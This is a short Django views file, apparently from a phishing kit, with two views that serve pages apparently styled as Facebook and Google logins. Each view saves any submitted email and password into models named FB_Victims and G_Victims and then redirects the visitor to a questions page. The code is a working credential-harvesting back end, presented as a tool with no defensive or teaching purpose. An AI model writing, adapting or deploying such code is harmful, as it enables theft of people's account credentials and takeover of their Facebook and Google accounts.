from django.shortcuts import render, redirect
from .models import G_Victims, FB_Victims
def fb(request):
    if request.method == 'POST':
        if request.POST.get('email') and request.POST.get('password'):
            post=FB_Victims()
            post.email= request.POST.get('email')
            post.password= request.POST.get('password')
            post.save()
            return redirect('/questions/')  

    else:
        return render(request,'fb/index.html')
    return render(request,'fb/index.html')
    
#=============================================

def google(request):
    if request.method == 'POST':
        if request.POST.get('email') and request.POST.get('password'):
            post=G_Victims()
            post.email= request.POST.get('email')
            post.password= request.POST.get('password')
            post.save()
            return redirect('/questions/')    

    else:
        return render(request,'google/index.html')
    return render(request,'google/index.html')
